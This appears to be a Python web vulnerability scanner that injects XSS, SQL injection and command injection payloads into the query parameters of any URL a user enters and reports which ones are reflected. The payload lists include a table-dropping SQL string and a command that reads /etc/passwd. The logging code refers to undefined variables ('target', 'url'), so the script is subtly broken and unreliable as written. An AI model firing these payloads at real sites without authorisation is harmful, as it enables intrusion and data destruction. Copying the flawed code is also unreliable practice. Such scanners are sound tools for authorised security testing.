import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common payloads for vulnerability detection
payloads = {
    "xss": ['<script>alert(1)</script>', '" onmouseover="alert(1)', "'><img src=x onerror=alert(1)>"],
    "sqli": ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --"],
    "cmd_injection": ['; ls', '&& whoami', '| cat /etc/passwd']
}

def inject_payloads(base_url):
    parsed = urlparse(base_url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        print("No parameters to test in the URL.")
        return

    else:
        for attack_type, payload_list in payloads.items():
            print(f"\nTesting for {attack_type.upper()} vulnerabilities:")
            for payload in payload_list:
                for param in query_params:
                    test_params = query_params.copy()
                    test_params[param] = payload
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    try:
                        response = requests.get(test_url, timeout=10)
                        if payload in response.text:
                            print(f"[+] Potential {attack_type.upper()} vulnerability with param '{param}' and payload: {payload}")

                            # Log potential vulnerabilities
                            file = f'{target}_vulns.txt'
                            path = f'{target}/{file}'
                            with open(path, 'a') as f:
                                f.write(f"{url}   - [+] Potential {attack_type.upper()} vulnerability with param '{param}' and payload: {payload}\n")
                                f.close()

                        else:
                            print(f"[-] Payload '{payload}' did not reflect in response for param '{param}'")
                    except requests.RequestException as e:
                        print(f"[!] Error testing {test_url}: {e}")


chars = ['#','?','&', '=']

def check_params(target, url):
    file = f'{target}_params.txt'
    path = f'{target}/{file}'
    inject_payloads(url)
    '''
    for char in chars:
        if char in url:
            line = f'<a href="{url}">{url}</a><br \>'
            with open(path, 'a') as newf:
                newf.write(line)
                newf.close()
'''

if __name__ == "__main__":
    test_url = input("Enter the URL to test (with parameters): ")
    inject_payloads(test_url)
